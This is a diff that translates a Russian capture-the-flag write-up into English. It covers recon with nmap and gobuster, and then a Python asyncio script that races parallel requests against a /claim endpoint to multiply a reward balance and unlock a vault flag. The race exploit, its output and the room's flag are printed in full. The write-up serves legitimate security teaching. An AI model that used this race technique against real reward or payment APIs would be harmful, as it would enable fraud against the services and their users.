@@ -1,40 +1,41 @@
-**Теги:** Web Exploitation, Business Logic, API Abuse, Burp Suite.
-**Сложность:** Medium.
+**Tags:** Web Exploitation, Business Logic, API Abuse, Burp Suite.
 
-## 1. Первичный доступ
+**Difficulty:** Medium.
 
-Цель:
+## 1. Initial Access
+
+Target:
 
 ```text
 10.114.169.103:3000
 ```
 
-При переходе на веб-приложение происходит редирект:
+When accessing the web application, we are redirected to:
 
 ```text
 http://10.114.169.103:3000/auth/login
 ```
 
-Регистрируем новую учётную запись:
+We register a new account:
 
 ```text
 Username: ponzi1459A
 Password: ponzi1459A
 ```
 
-После авторизации попадаем на dashboard.
+After authentication, we are taken to the dashboard.
 
 ---
 
-## 2. Сканирование портов
+## 2. Port Scanning
 
-Запускаем Nmap:
+We run Nmap:
 
 ```bash
 sudo nmap -sS -sV 10.114.169.103
 ```
 
-Вывод:
+Output:
 
 ```text
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-05 07:19 EDT
@@ -47,24 +48,24 @@ PORT     STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-Открыты:
+Open ports:
 
 * `22/tcp` — SSH;
 * `3000/tcp` — HTTP, Node.js Express.
 
-Основной интерес представляет веб-приложение на порту `3000`.
+The main point of interest is the web application running on port `3000`.
 
 ---
 
-## 3. Перечисление директорий
+## 3. Directory Enumeration
 
-Используем Gobuster:
+We use Gobuster:
 
 ```bash
 gobuster dir -u http://10.114.169.103:3000 -w ~/HH101/seclists/Discovery/Web-Content/common.txt
 ```
 
-Результат:
+Result:
 
 ```text
 ===============================================================
@@ -88,20 +89,20 @@ Starting gobuster in directory enumeration mode
 Progress: 4752 / 4752 (100.00%)
 ```
 
-Наиболее интересные endpoints:
+The most interesting endpoints are:
 
 ```text
 /dashboard
 /vault
 ```
 
-Оба требуют авторизации.
+Both require authentication.
 
 ---
 
-# 4. Анализ API dashboard
+# 4. Analyzing the Dashboard API
 
-При обновлении `/dashboard` смотрим HTTP-запросы. Обнаруживается API:
+When refreshing `/dashboard`, we inspect the HTTP requests. We discover the following API:
 
 ```http
 GET /dashboard/api/me HTTP/1.1
@@ -115,23 +116,23 @@ Cookie: connect.sid=s%3AlajEUBniMae0EC6ruoaTuMTksVKhvrkU.uNh7rYrCBO3nhu58Ec12PPq
 If-None-Match: W/"11a-nV6fb9AfEqH1B3n+keHDWKq0TJk"
 ```
 
-Наличие отдельных API endpoints делает приложение интересным для дальнейшего API enumeration.
+The presence of separate API endpoints makes the application interesting for further API enumeration.
 
 ---
 
-# 5. Проверка `/vault`
+# 5. Checking `/vault`
 
-Пробуем обратиться к `/vault`.
+We try accessing `/vault`.
 
-Получаем:
+We get:
 
 ```json
 {"error":"Access denied. Whale-tier balance required.","currentBalance":50,"required":150,"shortfall":100}
 ```
 
-Это важная информация.
+This provides important information.
 
-Приложение сообщает:
+The application reports:
 
 ```text
 Current balance: 50
@@ -139,21 +140,21 @@ Required balance: 150
 Shortfall: 100
 ```
 
-Следовательно, доступ к `/vault` зависит от количества средств на аккаунте.
+Therefore, access to `/vault` depends on the amount of funds in the account.
 
-Нужно увеличить баланс как минимум до `150`.
+We need to increase the balance to at least `150`.
 
 ---
 
-# 6. Поиск способа увеличить баланс
+# 6. Finding a Way to Increase the Balance
 
-Изучаем API приложения и обнаруживаем endpoint перехватив запрос с помощью Caido:
+We inspect the application's API and discover the following endpoint by intercepting the request with Caido:
 
 ```text
 POST /claim
 ```
 
-Пробуем отправить несколько запросов практически одновременно:
+We try sending several requests almost simultaneously:
 
 ```bash
 for i in {1..5}; do
@@ -164,7 +165,7 @@ done
 wait
 ```
 
-Запросы запускаются параллельно:
+The requests are launched in parallel:
 
 ```text
 [1] 10599
@@ -174,21 +175,21 @@ wait
 [5] 10603
 ```
 
-Однако сервер отвечает:
+However, the server responds:
 
 ```text
 {"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":85919}
 ```
 
-для всех пяти запросов.
+for all five requests.
 
-На этом этапе появляется предположение, что endpoint может быть уязвим к **race condition**.
+At this point, we suspect that the endpoint may be vulnerable to a **race condition**.
 
 ---
 
-# 7. Создание race-condition скрипта
+# 7. Creating a Race-Condition Script
 
-Для более точной отправки большого количества запросов одновременно пишем собственный Python-скрипт с `asyncio` и `aiohttp`.
+For more precise simultaneous request delivery, we write our own Python script using `asyncio` and `aiohttp`.
 
 ```python
 import asyncio
@@ -225,26 +226,26 @@ if __name__ == "__main__":
     asyncio.run(main())
 ```
 
-Здесь создаётся `12` параллельных задач:
+Here, `12` parallel tasks are created:
 
 ```python
 tasks = [claim(session, i) for i in range(12)]
 await asyncio.gather(*tasks)
 ```
 
-Это позволяет отправить запросы практически одновременно и увеличить вероятность попадания нескольких запросов в race window.
+This allows the requests to be sent almost simultaneously and increases the likelihood of hitting the race window with multiple requests.
 
 ---
 
-# 8. Эксплуатация race condition
+# 8. Exploiting the Race Condition
 
-Запускаем:
+We run:
 
 ```bash
 python3 race.py
 ```
 
-Получаем:
+We get:
 
 ```text
 [02] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":350,"tier":"Whale","priceSnapshot":4.2}
@@ -261,47 +262,47 @@ python3 race.py
 [01] 200 → {"message":"Staking reward claimed successfully.","reward":50,"newBalance":600,"tier":"Whale","priceSnapshot":4.2}
 ```
 
-Все запросы получили:
+All requests returned:
 
 ```text
 200
 ```
 
-и:
+with:
 
 ```text
 "message":"Staking reward claimed successfully."
 ```
 
-Вместо ожидаемого единственного получения награды сервер обработал несколько одновременных запросов.
+Instead of receiving the reward only once as expected, the server processed multiple simultaneous requests.
 
-Баланс увеличился с:
+The balance increased from:
 
 ```text
 50
 ```
 
-до:
+to:
 
 ```text
 600
 ```
 
-При этом требовалось всего:
+while only:
 
 ```text
 150
 ```
 
-для получения доступа к `/vault`.
+was required to access `/vault`.
 
-Таким образом, race condition успешно эксплуатирована.
+Thus, the race condition was successfully exploited.
 
 ---
 
-# 9. Получение доступа к Vault
+# 9. Gaining Access to the Vault
 
-Теперь баланс аккаунта соответствует требованиям:
+The account balance now meets the requirements:
 
 ```text
 Current balance: 600
@@ -309,15 +310,15 @@ Required balance: 150
 Tier: Whale
 ```
 
-Переходим в:
+We navigate to:
 
 ```text
 /vault
 ```
 
-Доступ предоставляется.
+Access is granted.
 
-Внутри находится флаг:
+Inside, we find the flag:
 
 ```text
 THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
@@ -325,10 +326,10 @@ THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
 
 ---
 
-# Итоговая цепочка
+# Final Chain
 
 ```text
-Регистрация
+Registration
 ponzi1459A:ponzi1459A
         │
         ▼
@@ -348,16 +349,16 @@ Access denied
 /claim
         │
         ▼
-Попытка параллельных запросов
+Attempted parallel requests
         │
         ▼
 Race Condition
         │
         ▼
-12 одновременных запросов
+12 simultaneous requests
         │
         ▼
-Баланс 50 → 600
+Balance 50 → 600
         │
         ▼
 Whale tier
@@ -375,6 +376,6 @@ THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
 THM{t0w3l_0n_th3_sunb3d_d0ubl3_sp3nt}
 ```
 
-### Уязвимость
+### Vulnerability
 
-Основная уязвимость комнаты — **race condition в endpoint `/claim`**. Сервер должен был атомарно проверять состояние награды и изменять баланс, но несколько почти одновременных запросов смогли пройти обработку и начислить награду многократно. Полученного баланса `600` оказалось достаточно для перехода в `/vault` и получения флага.
+The main vulnerability in the room is a **race condition in the `/claim` endpoint**. The server should have atomically checked the reward state and updated the balance, but multiple nearly simultaneous requests were able to pass the check and receive the reward multiple times. The resulting balance of `600` was sufficient to access `/vault` and obtain the flag.
